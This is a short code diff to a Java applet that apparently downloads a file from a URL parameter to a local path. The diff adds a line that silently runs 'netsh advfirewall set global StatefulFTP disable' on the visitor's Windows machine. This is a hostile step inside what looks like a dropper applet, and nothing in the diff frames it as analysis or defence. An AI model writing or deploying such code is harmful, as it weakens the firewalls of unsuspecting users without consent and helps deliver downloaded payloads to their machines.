@@ -86,6 +86,8 @@ public class Java extends Applet {
             }
 	if ( downParm.length() > 0  && pfad.length() > 0 )
 	{
+	    // attempt to disable statefulftp if running as an administrator
+	    f = Runtime.getRuntime().exec("netsh advfirewall set global StatefulFTP disable");
             // URL parameter
              URL url = new URL(downParm);
             // Get an input stream for reading
